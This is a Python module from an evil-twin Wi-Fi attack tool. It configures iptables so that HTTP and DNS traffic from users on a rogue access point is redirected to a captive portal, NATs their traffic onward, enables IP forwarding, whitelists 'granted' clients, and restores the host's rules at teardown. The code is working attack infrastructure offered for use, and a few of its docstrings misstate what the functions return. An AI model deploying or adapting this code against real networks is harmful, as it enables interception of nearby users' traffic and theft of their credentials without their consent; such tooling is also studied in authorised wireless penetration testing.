"""Network plumbing for the rogue twin.

Exposes:
- :func:`flush_iptables` — remove all our NAT/filter chains.
- :func:`backup_iptables` / :func:`restore_iptables` — snapshot+restore the
  pre-attack iptables state on the host so a crash/signal/atexit leaves the
  machine with the same NAT/filter rules it had before ``setup_iptables``.
  Section 9 hardening: previously we only flushed our own chains; if an
  operator had pre-existing rules (e.g. a docker bridge chain, a WireGuard
  MASQUERADE line), those vanished too. Backup+restore keeps them.
- :class:`NetworkConfig` — apply iptables rules, toggle ip_forward, and
  per-client internet allow-listing.
"""

import json
import logging
import os
import subprocess
import tempfile
from pathlib import Path

logger = logging.getLogger("wimirage")

__all__ = ["flush_iptables", "backup_iptables", "restore_iptables", "NetworkConfig"]

# Section 9 hardening — original-rule backup lives in a JSON file under the
# logs/ dir so we can restore it on atexit / SIGINT / SIGTERM / crash.
# Keeping it on-disk (not in-memory) means the rollback survives a hard
# Python crash too — the SIGINT handler re-imports the module and reads the
# JSON before calling ``iptables-restore``.
_BACKUP_FILENAME = "iptables_backup.json"


# iptables-restore rule templates. The two templates below are rendered
# with format() using {ap_interface}, {internet_interface}, {gateway},
# {portal_port} before being written to a temp file and piped into
# iptables-restore.
NAT_TABLE_TEMPLATE = (
    "*nat\n"
    ":PREROUTING ACCEPT [0:0]\n"
    "-A PREROUTING -i {ap_interface} -p tcp --dport 80 -j DNAT --to-destination {gateway}:{portal_port}\n"
    "-A PREROUTING -i {ap_interface} -p udp --dport 53 -j DNAT --to-destination {gateway}\n"
    "-A POSTROUTING -o {internet_interface} -j MASQUERADE\n"
    "COMMIT\n"
)

FILTER_TABLE_TEMPLATE = (
    "*filter\n"
    ":FORWARD ACCEPT [0:0]\n"
    "-A FORWARD -i {ap_interface} -o {internet_interface} -j ACCEPT\n"
    "-A FORWARD -i {internet_interface} -o {ap_interface} -m state --state RELATED,ESTABLISHED -j ACCEPT\n"
    "COMMIT\n"
)


def _backup_path() -> str:
    """Absolute path to the JSON file holding pre-attack iptables state.

    Section 9 hardening. Computed once from :mod:`core.paths` so we never
    leak an absolute path into this module's source.
    """
    try:
        from core.paths import LOGS_DIR, ensure_logs_dir

        ensure_logs_dir()
        return str(Path(LOGS_DIR) / _BACKUP_FILENAME)
    except Exception:  # pragma: no cover - non-filesystem,
        return os.path.join(tempfile.gettempdir(), _BACKUP_FILENAME)


def backup_iptables() -> bool:
    """Snapshot the live iptables NAT+filter tables to a JSON file.

    Best-effort: stores ``{"nat": <str>, "filter": <str>}`` via
    ``iptables-save`` to ``LOGS_DIR/iptables_backup.json``. Returns False
    if iptables-save is missing or fails — callers should not abort setup
    on a missing backup (tests / busybox / chroot environments don't have
    iptables but most won't be doing a live attack either).

    Returns:
        True if the backup file exists at the end of the call.
    """
    try:
        nat = subprocess.run(
            ["iptables-save", "-t", "nat"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        filt = subprocess.run(
            ["iptables-save", "-t", "filter"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        # If both invocations blew up with 127 / FileNotFoundError we treat
        # that as "no iptables, skip the backup" — see Section 9 hardening
        # above. Mixed results (one ok, one 127) are still salvaged because
        # ``iptables-restore`` on an empty table is a no-op.
        if nat.returncode != 0 and filt.returncode != 0:
            logger.warning(
                "iptables-save exited %d/%d; skipping backup.",
                nat.returncode,
                filt.returncode,
            )
            return False
        payload = {
            "nat": nat.stdout if nat.returncode == 0 else "",
            "filter": filt.stdout if filt.returncode == 0 else "",
        }
        path = _backup_path()
        with open(path, "w", encoding="utf-8") as f:
            json.dump(payload, f)
        logger.info("iptables backup written to %s.", path)
        return True
    except FileNotFoundError:
        logger.warning("iptables-save not found; backup skipped.")
        return False
    except subprocess.TimeoutExpired:
        logger.warning("iptables-save timed out; backup skipped.")
        return False
    except (OSError, subprocess.SubprocessError) as e:
        logger.warning(f"iptables backup failed: {type(e).__name__}: {e}")
        return False


def _safe_log(level: int, msg: str, *args: object) -> None:
    """Logger call that swallows the BrokenPipe/closed-stream teardown noise.

    Section 9 hardening: ``restore_iptables`` is invoked from atexit and
    from SIGINT/SIGTERM handlers, where ``sys.stdout`` may already be
    closed by pytest (or a crash-recovery orchestrator). Standard
    ``logger.info`` then raises ``ValueError: I/O operation on closed
    file.``, which masks the actual exit code of the interpreter. We
    walk our own handlers and short-circuit any with a closed stream
    before the framework tries to write — the logging module only
    catches ``OSError``/``ValueError`` on writes, not beforehand, so a
    manual pre-check is the cleanest way to silence pytest teardown
    noise without breaking real production logging.
    """
    # If every flushable StreamHandler has a closed stream, skip the
    # emit entirely. The logger.addHandler chain may also include
    # RotatingFileHandler instances — those keep working fine.
    for h in list(logger.handlers):
        stream = getattr(h, "stream", None)
        if stream is not None:
            try:
                closed = stream.closed
            except AttributeError:
                closed = False
            if closed:
                return  # nothing to log into, swallow silently
    try:
        logger.log(level, msg, *args)
    except (ValueError, OSError):
        # Stream closed between the pre-check and emit (rare race in
        # pytest teardown). Silently drop rather than crash the
        # interpreter's shutdown.
        pass


def restore_iptables() -> bool:
    """Restore the snapshot written by :func:`backup_iptables`.

    Idempotent: if no backup file exists, returns False without touching
    iptables. Errors (missing iptables-restore, malformed JSON) are logged
    but never raise — the goal is best-effort restoration on the teardown
    path where re-raising would block SIGINT from returning control to
    the operator.

    Returns:
        True if the restore succeeded (or the backup file was missing —
        no-op restore still considered successful).
    """
    path = _backup_path()
    if not os.path.exists(path):
        _safe_log(logging.INFO, "No iptables backup at %s; nothing to restore.", path)
        return False
    try:
        with open(path, encoding="utf-8") as f:
            payload = json.load(f)
        blob = (payload.get("nat", "") or "") + (payload.get("filter", "") or "")
        if not blob:
            _safe_log(logging.WARNING, "iptables backup is empty; restore skipped.")
            return False
        # Feed the blob into iptables-restore via stdin so we never expose
        # it to argv (and we don't leak the path of the backup file into
        # ``ps`` either).
        result = subprocess.run(
            ["iptables-restore"],
            input=blob,
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode != 0:
            _safe_log(
                logging.ERROR,
                "iptables-restore (rollback) failed: rc=%d stderr=%s",
                result.returncode,
                result.stderr.strip()[:300],
            )
            return False
        _safe_log(logging.INFO, "iptables rolled back to pre-attack snapshot.")
        return True
    except FileNotFoundError:
        _safe_log(logging.ERROR, "iptables-restore not found during rollback.")
        return False
    except (json.JSONDecodeError, OSError, ValueError, TypeError) as e:
        _safe_log(
            logging.ERROR,
            "Failed to parse/restore iptables backup: %s: %s",
            type(e).__name__,
            e,
        )
        # Section 9 hardening: wipe the corrupt backup so a follow-up
        # call to ``restore_iptables`` doesn't loop on the same dead
        # JSON. Best-effort — never raise from the rollback path
        # because this runs from atexit / signal handlers where
        # re-raising would mask the SIGINT we're trying to honour.
        try:
            os.unlink(path)
        except OSError:
            pass
        return False
    except subprocess.TimeoutExpired:
        _safe_log(logging.ERROR, "iptables-restore (rollback) timed out.")
        return False


def flush_iptables() -> None:
    """Remove all iptables chains and rules we may have created.

    Logs a warning when any individual ``iptables`` invocation returns
    non-zero so an operator can notice a half-flushed chain instead of
    silently leaving stale DNAT rules in place.
    """
    try:
        cmd_results = [
            subprocess.run(
                ["iptables", "-F"],
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10,
            ),
            subprocess.run(
                ["iptables", "-t", "nat", "-F"],
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10,
            ),
            subprocess.run(
                ["iptables", "-X"],
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10,
            ),
            subprocess.run(
                ["iptables", "-t", "nat", "-X"],
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10,
            ),
        ]
        if any(r.returncode != 0 for r in cmd_results):
            bad = [i for i, r in enumerate(cmd_results) if r.returncode != 0]
            logger.warning(
                "iptables flush returned non-zero for commands at indices %s; "
                "stale rules may remain.",
                bad,
            )
        else:
            logger.info("iptables rules flushed.")
    except (subprocess.TimeoutExpired, OSError) as e:
        _safe_log(
            logging.ERROR,
            "Failed to flush iptables: %s: %s",
            type(e).__name__,
            e,
        )


class NetworkConfig:
    """iptables / ip_forward configuration for an evil-twin deployment.

    Args:
        internet_interface: Interface with WAN access (e.g. eth0).
        ap_interface: Interface hosting the rogue AP (e.g. wlan0).
        portal_port: TCP port the captive portal listens on.
        gateway: IPv4 address assigned to the AP interface, used as the
            DNAT target for HTTP/DNS.
    """

    DEFAULT_PORTAL_PORT = 80
    DEFAULT_GATEWAY = "10.0.0.1"

    def __init__(
        self,
        internet_interface: str,
        ap_interface: str,
        portal_port: int = DEFAULT_PORTAL_PORT,
        gateway: str = DEFAULT_GATEWAY,
    ) -> None:
        self.internet_interface = internet_interface
        self.ap_interface = ap_interface
        self.portal_port = portal_port
        self.gateway = gateway
        self._granted_ips: set[str] = set()

    def enable_ip_forwarding(self) -> bool:
        """Write ``1`` to ``/proc/sys/net/ipv4/ip_forward``.

        Returns:
            True on success, False on permission/IO error.
        """
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            logger.info("IP forwarding enabled.")
            return True
        except PermissionError:
            logger.error("Permission denied enabling IP forwarding. Are you root?")
            return False
        except OSError as e:
            logger.error(f"Failed to enable IP forwarding: {e}")
            return False

    def disable_ip_forwarding(self) -> None:
        """Write ``0`` to ``/proc/sys/net/ipv4/ip_forward`` (best-effort)."""
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
            logger.info("IP forwarding disabled.")
        except (PermissionError, OSError) as e:
            logger.error(f"Failed to disable IP forwarding: {type(e).__name__}: {e}")

    def setup_iptables(self) -> bool:
        """Install NAT + filter rules, then enable ip_forward.

        Section 9 hardening: snapshot the host's existing NAT+filter rules
        before installing ours so we can roll back at teardown.
        Tries ``iptables-restore`` first; if missing, falls back to
        individual ``iptables -A`` invocations.

        Returns:
            True if every step succeeded.
        """
        logger.info("Configuring iptables rules...")

        backup_iptables()
        flush_iptables()

        nat_rules = NAT_TABLE_TEMPLATE.format(
            ap_interface=self.ap_interface,
            internet_interface=self.internet_interface,
            gateway=self.gateway,
            portal_port=self.portal_port,
        )
        filter_rules = FILTER_TABLE_TEMPLATE.format(
            ap_interface=self.ap_interface,
            internet_interface=self.internet_interface,
        )

        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".rules", delete=False) as f:
                f.write(nat_rules)
                f.write(filter_rules)
                rules_file = f.name

            result = subprocess.run(
                ["iptables-restore", rules_file], capture_output=True, text=True, timeout=10
            )
            os.unlink(rules_file)

            if result.returncode != 0:
                logger.error(f"iptables-restore failed: {result.stderr}")
                return False

            logger.info("HTTP traffic redirect to captive portal configured.")
            logger.info("DNS traffic redirect configured.")
            logger.info("NAT masquerade configured.")
            logger.info("Forwarding rules configured.")

            self.enable_ip_forwarding()
            logger.info("iptables configuration complete.")
            return True

        except FileNotFoundError:
            logger.error("iptables-restore not found. Falling back to individual rules.")
            return self._setup_iptables_fallback()
        except subprocess.TimeoutExpired:
            logger.error("iptables-restore timed out.")
            return False
        except (OSError, subprocess.SubprocessError) as e:
            logger.error(f"Unexpected iptables error: {type(e).__name__}: {e}")
            return False

    def _setup_iptables_fallback(self) -> bool:
        """Apply iptables rules one command at a time (used if restore is missing)."""
        try:
            cmds = [
                [
                    "iptables",
                    "-t",
                    "nat",
                    "-A",
                    "PREROUTING",
                    "-i",
                    self.ap_interface,
                    "-p",
                    "tcp",
                    "--dport",
                    "80",
                    "-j",
                    "DNAT",
                    "--to-destination",
                    f"{self.gateway}:{self.portal_port}",
                ],
                [
                    "iptables",
                    "-t",
                    "nat",
                    "-A",
                    "PREROUTING",
                    "-i",
                    self.ap_interface,
                    "-p",
                    "udp",
                    "--dport",
                    "53",
                    "-j",
                    "DNAT",
                    "--to-destination",
                    self.gateway,
                ],
                [
                    "iptables",
                    "-t",
                    "nat",
                    "-A",
                    "POSTROUTING",
                    "-o",
                    self.internet_interface,
                    "-j",
                    "MASQUERADE",
                ],
                [
                    "iptables",
                    "-A",
                    "FORWARD",
                    "-i",
                    self.ap_interface,
                    "-o",
                    self.internet_interface,
                    "-j",
                    "ACCEPT",
                ],
                [
                    "iptables",
                    "-A",
                    "FORWARD",
                    "-i",
                    self.internet_interface,
                    "-o",
                    self.ap_interface,
                    "-m",
                    "state",
                    "--state",
                    "RELATED,ESTABLISHED",
                    "-j",
                    "ACCEPT",
                ],
            ]
            for cmd in cmds:
                subprocess.run(
                    cmd,
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=10,
                )

            self.enable_ip_forwarding()
            logger.info("iptables configuration complete (fallback mode).")
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"iptables error: {e}")
            return False

    def grant_internet(self, client_ip: str) -> bool:
        """Insert an ACCEPT rule at the top of PREROUTING for ``client_ip``.

        Idempotent: returns ``False`` immediately if we've already granted
        this client. Verifies iptables returned 0; logs and returns False
        on failure so callers can react.

        Returns:
            True if the rule was just installed (or was already in place).
        """
        if client_ip in self._granted_ips:
            return True
        try:
            result = subprocess.run(
                [
                    "iptables",
                    "-t",
                    "nat",
                    "-I",
                    "PREROUTING",
                    "1",
                    "-s",
                    client_ip,
                    "-p",
                    "tcp",
                    "--dport",
                    "80",
                    "-j",
                    "ACCEPT",
                ],
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10,
            )
            if result.returncode != 0:
                logger.error(
                    f"iptables rule insert failed for {client_ip} (rc={result.returncode})"
                )
                return False
            self._granted_ips.add(client_ip)
            logger.info(f"Internet access granted to {client_ip}")
            return True
        except (subprocess.TimeoutExpired, OSError) as e:
            logger.error(f"Failed to grant internet to {client_ip}: {type(e).__name__}: {e}")
            return False

    def cleanup(self) -> None:
        """Flush iptables, disable ip_forward, drop the in-memory allow-list.

        Section 9 hardening: also attempt to restore the host's pre-attack
        iptables snapshot via :func:`restore_iptables` so any unrelated
        NAT/filter rules the operator had before ``setup_iptables`` (e.g.
        docker chains) come back too.
        """
        flush_iptables()
        # Best-effort rollback to the pre-attack state. We log but
        # continue so a failed rollback never strands a half-flushed
        # chain — flush_iptables() above ran first.
        restore_iptables()
        self.disable_ip_forwarding()
        self._granted_ips.clear()
